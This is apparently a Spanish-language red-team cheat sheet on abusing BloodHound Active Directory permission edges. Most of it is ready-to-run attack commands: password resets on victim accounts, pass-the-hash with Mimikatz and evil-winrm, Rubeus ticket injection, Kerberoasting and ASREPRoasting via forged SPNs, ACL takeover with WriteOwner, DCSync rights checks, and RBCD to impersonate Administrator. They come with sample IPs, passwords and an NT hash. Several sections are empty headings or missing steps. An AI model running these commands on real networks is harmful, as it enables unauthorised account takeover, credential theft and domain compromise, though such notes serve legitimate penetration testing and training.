## Nota general: con credenciales conocidas vs. shell ya obtenida

Casi todos los edges de abuso admiten dos escenarios distintos, y la mayoría de las secciones de este documento incluyen ambos:

- **Con credenciales conocidas** - se conoce la contraseña (o hash) del atacante y se ataca **remotamente** desde otra máquina (Windows con `-Credential`, o Linux con `usuario:password` en Impacket/`net`/`bloodyAD`). Es el escenario típico cuando se crackeó una contraseña o se filtró en algún archivo.
- **Shell ya obtenida (sin credenciales conocidas)** - ya se tiene una sesión interactiva como el atacante (reverse shell, RDP, tarea programada comprometida, logon script envenenado, etc.), sin haber llegado a conocer su contraseña en texto plano. En este caso, ejecutar los mismos cmdlets **sin** `-Credential` funciona igual, porque el token de la sesión de Windows autentica automáticamente todas las peticiones LDAP salientes.

Este segundo escenario es extremadamente común en la práctica: muchos vectores de compromiso inicial (phishing, explotación de un servicio, poisoning de un script) entregan una shell directamente, sin pasar nunca por conocer la contraseña real de la cuenta comprometida.

## Cómo usar pathfinding para encontrar rutas de ataque

1. Buscar el nodo origen en la barra de búsqueda
2. Clic derecho → **Set as Starting Node**
3. Buscar el nodo destino
4. Clic derecho → **Set as Ending Node**
5. BloodHound muestra el camino más corto

Si una ruta usa un edge que se quiere evitar, usar el filtro para excluirlo y BloodHound busca una ruta alternativa.

## Abuso de edges - Comandos

### ForceChangePassword

El usuario atacante tiene el derecho de resetear la contraseña de la víctima sin conocer la contraseña actual. Útil para tomar control de una cuenta y luego usarla para moverse lateralmente.

```powershell
$SecPassword = ConvertTo-SecureString '<password_atacante>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', $SecPassword)
$UserPassword = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <objetivo> -AccountPassword $UserPassword -Credential $Cred -Verbose

# Alternativa nativa (más ruidoso)
net user <objetivo> <nueva_password> /domain

# Ejemplo
$SecPassword = ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force
Set-DomainUserPassword -Identity test -AccountPassword $UserPassword -Credential $Cred -Verbose
```

#### Variante sin credenciales conocidas (ya con shell como el atacante)

Si ya se tiene una sesión interactiva como el atacante (reverse shell, RDP, tarea programada comprometida, etc.) sin conocer su contraseña, no hace falta construir el objeto `-Credential`: el token de la sesión actual autentica automáticamente.

```powershell
$UserPassword = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <objetivo> -AccountPassword $UserPassword

# Ejemplo
$UserPassword = ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force
Set-DomainUserPassword -Identity test -AccountPassword $UserPassword
```

#### Equivalente desde Linux (con credenciales conocidas)

```bash
net rpc password <objetivo> '<nueva_password>' -U domain.local/<atacante>%'<password>' -S <IP_DC>
bloodyAD --host "<IP_DC>" -d "domain.local" -u "<atacante>" -p '<password>' set password "<objetivo>" "<nueva_password>"

# Alternativa con rpcclient
rpcclient -U DOMAIN/<atacante>%'<password>' <IP_DC>
rpcclient $> setuserinfo2 <objetivo> 23 '<nueva_password>'

# Ejemplo
net rpc password test 'Summer2024!' -U domain.local/seven%'PasswordAD01' -S 10.10.10.129
```

#### Con Hash NTLM (Linux y Windows)

```bash
# Linux
net rpc password <objetivo> '<nueva_password>' -U 'domain.local/<atacante>%<NTHASH>' --pw-nt-hash -S <IP_DC>
bloodyAD --host "<IP_DC>" -d "domain.local" -u "<atacante>" -p ':<NTHASH>' set password "<objetivo>" "<nueva_password>"
```

```powershell
# Windows: Mimikatz abre una consola que "es" el atacante, o Rubeus inyecta un TGT con el hash
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<atacante> /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe" exit
.\Rubeus.exe asktgt /user:<atacante> /rc4:<NTHASH> /domain:domain.local /dc:DC01.domain.local /ptt
# Desde esa sesión, sin -Credential
Set-DomainUserPassword -Identity <objetivo> -AccountPassword (ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force)
```

#### Con TGT (Linux y Windows)

```bash
getTGT.py DOMAIN.LOCAL/<atacante> -hashes :<NTHASH> -dc-ip <IP_DC>
export KRB5CCNAME=./<atacante>.ccache
net rpc password <objetivo> '<nueva_password>' -k -S DC01.domain.local
bloodyAD --host DC01.domain.local -d domain.local -k set password "<objetivo>" "<nueva_password>"
```

```powershell
.\Rubeus.exe ptt /ticket:<atacante>.kirbi
# Si el ticket está en .ccache (de Linux), convertirlo primero
ticketConverter.py <atacante>.ccache <atacante>.kirbi
Set-DomainUserPassword -Identity <objetivo> -AccountPassword (ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force)
```

### CanRDP

El usuario tiene permisos para conectarse al host vía Remote Desktop. Permite obtener una sesión gráfica interactiva, lo que genera un TGT completo en memoria y habilita herramientas que fallan desde WinRM (por el problema del Double Hop).

```bash
xfreerdp /v:<IP> /u:<usuario> /p:<password>

# Ejemplo
xfreerdp /v:10.10.10.129 /u:seven /p:PasswordAD01
```

Equivalente desde Windows:

```powershell
mstsc /v:<IP>
# o con credenciales inline guardadas antes con cmdkey
cmdkey /generic:<IP> /user:<usuario> /pass:<password>
mstsc /v:<IP>
```

#### Con Hash NTLM (Restricted Admin Mode)

RDP no acepta un hash NTLM directamente salvo que el host tenga habilitado **Restricted Admin Mode** (`reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0`); si está activo, se puede usar Pass-the-Hash con `xfreerdp`:

```bash
xfreerdp /v:<IP> /u:<usuario> /pth:<NTHASH>

# Ejemplo
xfreerdp /v:10.10.10.129 /u:seven /pth:88ad09182de639ccc6579eb0849751cf
```

#### Con TGT (sesión sacrificial en Windows)

```powershell
.\Rubeus.exe asktgt /user:<usuario> /rc4:<NTHASH> /domain:domain.local /dc:DC01.domain.local /ptt
mstsc /v:<IP>
```

#### Sin credenciales (ya con una sesión RDP/WinRM abierta)

Si ya se tiene una sesión como el usuario con `CanRDP` (por ejemplo, vía WinRM), basta con saltar al segundo host desde ahí, repitiendo `xfreerdp`/`mstsc` con el token de la sesión actual (ver aviso de Double Hop más abajo).

### CanPSRemote

El usuario puede conectarse al host vía WinRM (puerto 5985/5986). Permite ejecutar comandos remotamente, aunque con las limitaciones del Double Hop que no genera TGT.

```bash
evil-winrm -i <IP> -u <usuario> -p <password>

# Ejemplo
evil-winrm -i 10.10.10.129 -u seven -p PasswordAD01
```

```powershell
# Desde Windows
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<usuario>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Enter-PSSession -ComputerName <host> -Credential $Cred

# Ejemplo
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', (ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force))
Enter-PSSession -ComputerName SRV01 -Credential $Cred
```

#### Con Hash NTLM (Linux y Windows)

```bash
evil-winrm -i <IP> -u <usuario> -H <NTHASH>

# Ejemplo
evil-winrm -i 10.10.10.129 -u seven -H 88ad09182de639ccc6579eb0849751cf
```

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<usuario> /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe" exit
# Desde esa consola
Enter-PSSession -ComputerName <host>
```

#### Con TGT (Linux y Windows)

```bash
getTGT.py DOMAIN.LOCAL/<usuario> -hashes :<NTHASH> -dc-ip <IP_DC>
export KRB5CCNAME=./<usuario>.ccache
evil-winrm -i <IP> -r domain.local
```

```powershell
.\Rubeus.exe ptt /ticket:<usuario>.kirbi
Enter-PSSession -ComputerName <host>
```

#### Sin credenciales (ya con sesión en otro host)

Dentro de una shell ya abierta como el usuario con `CanPSRemote`, repetir `Enter-PSSession`/`evil-winrm` contra el nuevo host funciona solo si no hay Double Hop de por medio (ver aviso más abajo); si falla, usar un TGT inyectado o `-H`/`-k` desde Linux en su lugar.

> **Aviso (Double Hop):** una sesión WinRM no delega credenciales a un segundo salto (consultar otro host desde dentro de la sesión WinRM). Usar una sesión RDP en su lugar, o repetir el salto desde Linux con el hash o el ticket del usuario.

### AdminTo

El usuario es administrador local en ese host. Permite ejecutar comandos como admin, dumpear credenciales con Mimikatz, leer la SAM, y moverse lateralmente desde ese host.

```bash
psexec.py DOMAIN/<usuario>:<password>@<IP>
wmiexec.py DOMAIN/<usuario>:<password>@<IP>
evil-winrm -i <IP> -u <usuario> -p <password>

# Ejemplo
psexec.py DOMAIN/seven:PasswordAD01@10.10.10.129
```

Equivalente desde Windows (ya unido al dominio o con runas):

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<usuario>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Enter-PSSession -ComputerName <host> -Credential $Cred
# o con psexec.exe de Sysinternals
PsExec64.exe \\<host> -u DOMAIN\<usuario> -p <password> cmd.exe
```

#### Con Hash NTLM (Linux y Windows)

```bash
psexec.py DOMAIN/<usuario>@<IP> -hashes :<NTHASH>
wmiexec.py DOMAIN/<usuario>@<IP> -hashes :<NTHASH>
evil-winrm -i <IP> -u <usuario> -H <NTHASH>
netexec smb <IP> -u <usuario> -H <NTHASH>

# Ejemplo
evil-winrm -i 10.10.10.129 -u seven -H 88ad09182de639ccc6579eb0849751cf
```

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<usuario> /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe" exit
```

#### Con TGT (Linux y Windows)

```bash
getTGT.py DOMAIN.LOCAL/<usuario> -hashes :<NTHASH> -dc-ip <IP_DC>
export KRB5CCNAME=./<usuario>.ccache
psexec.py -k -no-pass DOMAIN/<usuario>@<host>.domain.local
wmiexec.py -k -no-pass DOMAIN/<usuario>@<host>.domain.local
```

```powershell
.\Rubeus.exe ptt /ticket:<usuario>.kirbi
# Desde esa sesión
Enter-PSSession -ComputerName <host>
```

#### Sin credenciales (ya con una sesión interactiva)

Dentro de una shell ya abierta como el usuario con `AdminTo`, cualquier herramienta de administración local (`PsExec64.exe`, `Enter-PSSession`) funciona directamente, sin volver a pasar credenciales.

### AddMembers

El usuario tiene permisos para agregar otros usuarios al grupo objetivo. Permite agregarse a sí mismo o a cualquier otra cuenta comprometida y heredar todos sus privilegios.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario_a_agregar>' -Credential $Cred -Verbose
Get-DomainGroupMember -Identity '<grupo>'

# Ejemplo
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', (ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force))
Add-DomainGroupMember -Identity 'ITManagers' -Members 'test' -Credential $Cred -Verbose
```

#### Variante sin credenciales conocidas (ya con shell como el atacante)

```powershell
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario_a_agregar>' -Verbose

# Ejemplo
Add-DomainGroupMember -Identity 'ITManagers' -Members 'test' -Verbose
```

#### Equivalente desde Linux (con credenciales conocidas)

```bash
net rpc group addmem '<grupo>' <usuario_a_agregar> -U domain.local/<atacante>%'<password>' -S <IP_DC>
bloodyAD --host "<IP_DC>" -d "domain.local" -u "<atacante>" -p '<password>' add groupMember "<grupo>" "<usuario_a_agregar>"

# Ejemplo
net rpc group addmem 'ITManagers' test -U domain.local/seven%'PasswordAD01' -S 10.10.10.129
```

#### Con Hash NTLM (Linux y Windows)

```bash
net rpc group addmem '<grupo>' <usuario_a_agregar> -U 'domain.local/<atacante>%<NTHASH>' --pw-nt-hash -S <IP_DC>
bloodyAD --host "<IP_DC>" -d "domain.local" -u "<atacante>" -p ':<NTHASH>' add groupMember "<grupo>" "<usuario_a_agregar>"
```

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<atacante> /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe" exit
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario_a_agregar>' -Verbose
```

#### Con TGT (Linux y Windows)

```bash
getTGT.py DOMAIN.LOCAL/<atacante> -hashes :<NTHASH> -dc-ip <IP_DC>
export KRB5CCNAME=./<atacante>.ccache
bloodyAD --host DC01.domain.local -d domain.local -k add groupMember "<grupo>" <usuario_a_agregar>
net rpc group addmem '<grupo>' <usuario_a_agregar> -k -S DC01.domain.local
```

```powershell
.\Rubeus.exe ptt /ticket:<atacante>.kirbi
Add-DomainGroupMember -Identity '<grupo>' -Members '<usuario_a_agregar>' -Verbose
```

### AddSelf

Similar a `AddMembers` pero el usuario solo puede agregarse a sí mismo al grupo, no a otros usuarios. Permite heredar los privilegios del grupo con solo una cuenta comprometida.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
Add-DomainGroupMember -Identity '<grupo>' -Members '<atacante>' -Credential $Cred -Verbose

# Ejemplo
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', (ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force))
Add-DomainGroupMember -Identity 'ITManagers' -Members 'seven' -Credential $Cred -Verbose
```

#### Variante sin credenciales conocidas (ya con shell como el atacante)

```powershell
Add-DomainGroupMember -Identity '<grupo>' -Members '<atacante>' -Verbose

# Ejemplo
Add-DomainGroupMember -Identity 'ITManagers' -Members 'seven' -Verbose
```

> **Nota:** con `Self-Membership` la utilidad `net` (Linux o Windows) **no funciona**, porque usa RPC y ese protocolo no respeta esta restricción de ACE; es obligatorio usar LDAP directamente (`Add-DomainGroupMember` en Windows, o un script con `ldap3` en Linux).

#### Equivalente desde Linux (con credenciales conocidas)

```bash
python3 addusertogroup.py -d domain.local -g "<grupo>" -a <atacante> -u <atacante> -p '<password>'

# Ejemplo
python3 addusertogroup.py -d domain.local -g "ITManagers" -a seven -u seven -p 'PasswordAD01'
```

#### Con Hash NTLM (Linux y Windows)

```bash
python3 addusertogroup.py -d domain.local -g "<grupo>" -a <atacante> -u <atacante> -p 'aad3b435b51404eeaad3b435b51404ee:<NTHASH>'
bloodyAD --host <IP_DC> -d domain.local -u <atacante> -p ':<NTHASH>' add groupMember "<grupo>" "<atacante>"
```

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<atacante> /domain:domain.local /ntlm:<NTHASH> /run:powershell.exe" exit
Add-DomainGroupMember -Identity '<grupo>' -Members '<atacante>' -Verbose
```

#### Con TGT (Linux y Windows)

```bash
getTGT.py DOMAIN.LOCAL/<atacante> -hashes :<NTHASH> -dc-ip <IP_DC>
export KRB5CCNAME=./<atacante>.ccache
python3 addusertogroup.py -d domain.local -g "<grupo>" -a <atacante> -u <atacante> -k
bloodyAD --host DC01.domain.local -d domain.local -k add groupMember "<grupo>" <atacante>
```

```powershell
.\Rubeus.exe ptt /ticket:<atacante>.kirbi
Add-DomainGroupMember -Identity '<grupo>' -Members '<atacante>' -Verbose
```

### GenericAll sobre usuario

Es el derecho más amplio posible sobre un objeto. El atacante tiene control total sobre la cuenta víctima: puede cambiar su contraseña, asignarle un SPN para Kerberoasting, quitarle la pre-autenticación para ASREPRoasting, o modificar cualquier atributo.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))

# Opción 1 - Cambiar contraseña (destructivo)
$NewPass = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <objetivo> -AccountPassword $NewPass -Credential $Cred -Verbose

# Opción 2 - SPN falso para Kerberoasting (menos destructivo)
Set-DomainObject -Credential $Cred -Identity <objetivo> -SET @{serviceprincipalname='fake/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<objetivo> /nowrap
# Cleanup
Set-DomainObject -Credential $Cred -Identity <objetivo> -Clear serviceprincipalname -Verbose

# Opción 3 - Deshabilitar pre-auth para ASREPRoasting (menos destructivo)
Set-DomainObject -Credential $Cred -Identity <objetivo> -XOR @{useraccountcontrol=4194304} -Verbose
.\Rubeus.exe asreproast /user:<objetivo> /nowrap

# Ejemplo (Opción 2)
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', (ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force))
Set-DomainObject -Credential $Cred -Identity test -SET @{serviceprincipalname='fake/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:test /nowrap
Set-DomainObject -Credential $Cred -Identity test -Clear serviceprincipalname -Verbose
```

#### Variante sin credenciales conocidas (ya con shell como el atacante)

Este es exactamente el caso real cuando se obtiene una shell mediante un vector como un logon script poisoning, sin necesitar la contraseña del atacante para actuar remotamente - el token de la sesión actual autentica automáticamente todas las peticiones LDAP:

```powershell
# Opción 1 - Cambiar contraseña (destructivo)
$NewPass = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <objetivo> -AccountPassword $NewPass

# Opción 2 - SPN falso para Kerberoasting (menos destructivo)
Set-DomainObject -Identity <objetivo> -SET @{serviceprincipalname='fake/LEGIT'} -Verbose
.\Rubeus.exe kerberoast /user:<objetivo> /nowrap
Set-DomainObject -Identity <objetivo> -Clear serviceprincipalname -Verbose

# Ejemplo (Opción 1) - igual al caso donde no se conocen las credenciales de la cuenta atacante
$NewPass = ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force
Set-DomainUserPassword -Identity test -AccountPassword $NewPass
```

#### Equivalente desde Linux (con credenciales conocidas)

```bash
# Opción 1 - Cambiar contraseña
net rpc password <objetivo> '<nueva_password>' -U domain.local/<atacante>%'<password>' -S <IP_DC>
```

### WriteOwner

El atacante puede cambiar el propietario del objeto víctima. El propietario tiene control implícito sobre él. Flujo: tomar propiedad → otorgarse `GenericAll` → abusar el objeto.

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))

# Paso 1 - Tomar propiedad del objeto
Set-DomainObjectOwner -Credential $Cred -Identity <objetivo> -OwnerIdentity <atacante> -Verbose

# Paso 2 - Otorgarse GenericAll
Add-DomainObjectAcl -Credential $Cred -TargetIdentity <objetivo> -PrincipalIdentity <atacante> -Rights All -Verbose

# Paso 3 - Abusar el GenericAll (ejemplo: cambiar contraseña)
$NewPass = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword -Identity <objetivo> -AccountPassword $NewPass -Credential $Cred -Verbose

# Ejemplo
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\seven', (ConvertTo-SecureString 'PasswordAD01' -AsPlainText -Force))
Set-DomainObjectOwner -Credential $Cred -Identity test -OwnerIdentity seven -Verbose
Add-DomainObjectAcl -Credential $Cred -TargetIdentity test -PrincipalIdentity seven -Rights All -Verbose
```

#### Variante sin credenciales conocidas (ya con shell como el atacante)

Este es un caso muy común en la práctica: se compromete una cuenta mediante un vector que entrega una shell interactiva (por ejemplo, envenenando un logon script en SYSVOL para obtener una reverse shell), sin llegar a conocer nunca la contraseña de esa cuenta en texto plano. Como la shell ya corre con el token de esa cuenta, no hace falta `-Credential` en ningún paso - PowerView usa automáticamente la sesión actual para autenticar contra LDAP.

```powershell
# Ya en una shell PowerShell como el atacante (reverse shell, tarea programada, etc.)
Import-Module .\PowerView.ps1

# Paso 1 - Otorgarse todos los derechos sobre el objetivo, sin pasar -Credential
Add-DomainObjectAcl -Rights all -TargetIdentity <objetivo> -PrincipalIdentity <atacante>

# Paso 2 - Resetear la contraseña del objetivo con el control recién obtenido
$cred = ConvertTo-SecureString '<nueva_password>' -AsPlainText -Force
Set-DomainUserPassword <objetivo> -AccountPassword $cred

# Ejemplo real (caso: cuenta objetivo GPOADM, atacante sin credenciales conocidas)
Add-DomainObjectAcl -Rights all -TargetIdentity GPOADM -PrincipalIdentity <atacante>
$cred = ConvertTo-SecureString 'Summer2024!' -AsPlainText -Force
Set-DomainUserPassword GPOADM -AccountPassword $cred
```

Validar las credenciales resultantes:

```bash
netexec smb <IP_DC> -u GPOADM -p 'Summer2024!'
```

> **Nota:** Este flujo funciona incluso cuando el objetivo (`GPOADM` en el ejemplo) es una cuenta de servicio con privilegios adicionales (por ejemplo, administración de GPOs), lo cual puede escalar aún más el impacto - desde resetear su contraseña, hasta modificar una GPO que aplica a un grupo privilegiado como Administrators.

#### Equivalente completo desde Linux (con credenciales conocidas)

Cuando sí se conocen las credenciales del atacante y se está atacando remotamente desde Linux, el flujo completo usa `owneredit.py` + `dacledit.py`:

```bash

# Paso 3 - Abusar el control (ejemplo: cambiar contraseña con net rpc)

# Ejemplo

impacket-dacledit -action 'write' -rights 'FullControl' -principal 'seven' -target-dn 'CN=test,CN=Users,DC=domain,DC=local' 'domain.local'/'seven':'PasswordAD01' -dc-ip 10.10.10.129
```

### GetChanges / GetChangesAll

`GetChanges` (`DS-Replication-Get-Changes`) y `GetChangesAll` (`DS-Replication-Get-Changes-All`) son los dos derechos individuales que, **combinados** sobre el objeto dominio, conforman el ataque `DCSync`. BloodHound los muestra por separado porque cada uno puede estar asignado a una cuenta distinta (por ejemplo, una cuenta con solo `GetChanges` no puede hacer DCSync completo por sí sola; necesita también `GetChangesAll`, y en entornos con RODC a veces también `Get-Changes-In-Filtered-Set`).

Si se tienen ambos sobre el dominio (`DC=domain,DC=local`), el abuso es exactamente `DCSync` (ver sección anterior). Si solo se controla uno de los dos, el camino es: usar `WriteDacl`/`GenericAll` sobre el dominio (si se tiene) para otorgarse el que falta, o buscar otra cuenta/grupo que ya tenga el complementario y unirse a ella.

```bash
# Verificar qué cuentas tienen cada derecho por separado
python3 examples/dacledit.py -target 'DC=domain,DC=local' -dc-ip <IP_DC> DOMAIN.LOCAL/<atacante>:'<password>' | grep -A3 -i "Get-Changes"
```

```cypher
MATCH p=((n)-[r:GetChanges]->(d:Domain)) RETURN p
MATCH p=((n)-[r:GetChangesAll]->(d:Domain)) RETURN p
```

### AllExtendedRights

### MemberOf

Indica que el nodo es miembro (directo o anidado) de un grupo. No es un edge "explotable" por sí mismo - es informativo - pero es la base para encontrar rutas de ataque: cualquier derecho que tenga el grupo lo heredan transitivamente todos sus miembros.

```cypher
# Membresía directa y anidada de un usuario
MATCH p=((u:User {name:"<ATACANTE>@DOMAIN.LOCAL"})-[r:MemberOf*1..]->(g:Group)) RETURN p
```


```powershell

# Sin credenciales (sesión ya abierta)
whoami /groups
Get-DomainGroup -MemberIdentity <atacante>
```


### HasSession

### WriteSPN

### AddAllowedToAct / WriteAccountRestrictions - Configurar RBCD

Ambos edges representan el mismo abuso: la capacidad de **escribir** el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objetivo (`AddAllowedToAct` es el derecho específico; `WriteAccountRestrictions` es más amplio e incluye ese atributo entre otros). Permite configurar RBCD para que una cuenta de equipo que se controla (o una creada para la ocasión) pueda impersonar usuarios ante el objetivo.

```powershell
# Sin credenciales (sesión ya abierta) - si no se controla ya una cuenta de equipo, crear una
# (requiere ms-DS-MachineAccountQuota > 0, por defecto 10)
New-MachineAccount -MachineAccount ATTACKERPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

$ComputerSid = Get-DomainComputer ATTACKERPC -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject <objetivo> -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose

# Pedir el ticket S4U2Self + S4U2Proxy impersonando al Administrator
.\Rubeus.exe s4u /user:ATTACKERPC$ /rc4:<NTHASH_ATTACKERPC> /impersonateuser:administrator /msdsspn:cifs/<objetivo> /ptt
```

```powershell
# Con credenciales conocidas (remoto, -Credential explícito)
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<atacante>', (ConvertTo-SecureString '<password>' -AsPlainText -Force))
New-MachineAccount -MachineAccount ATTACKERPC -Password (ConvertTo-SecureString 'Password123!' -AsPlainText -Force) -Credential $Cred
$ComputerSid = Get-DomainComputer ATTACKERPC -Credential $Cred -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject <objetivo> -Credential $Cred -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes} -Verbose
```

```bash
# Linux
```

## Resumen de edges por categoría de abuso

- **Movimiento lateral directo:** `AdminTo`, `CanRDP`, `CanPSRemote`, `ExecuteDCOM`, `SQLAdmin`
- **Control total sobre objetos:** `GenericAll`, `WriteDACL`, `WriteOwner`, `Owns`
- **Escritura parcial/dirigida:** `GenericWrite`, `WriteSPN`, `AddKeyCredentialLink`, `WriteAccountRestrictions`
- **Membresía de grupos:** `AddMembers`, `AddSelf`, `MemberOf`
- **Credenciales y secretos:** `ForceChangePassword`, `ReadLAPSPassword`, `ReadGMSAPassword`, `DCSync`, `GetChanges`, `GetChangesAll`
- **Delegación Kerberos:** `AllowedToDelegate`, `AllowedToAct`, `AddAllowedToAct`
- **Extendidos/genéricos:** `AllExtendedRights`

## Resumen: credenciales conocidas vs. shell ya obtenida

- Si se conoce la contraseña/hash del atacante y se ataca remotamente → usar `-Credential` (PowerShell) o `usuario:password` explícito (Impacket, `net`, `bloodyAD`)
- Si ya se tiene una shell interactiva como el atacante sin conocer su contraseña → omitir `-Credential` en PowerShell; el token de sesión autentica automáticamente
- Herramientas Linux equivalentes para el mismo abuso: `impacket-owneredit`/`impacket-dacledit` (control de ACL), `net rpc` (membresía y contraseñas vía Samba), `bloodyAD` (todo en un comando)
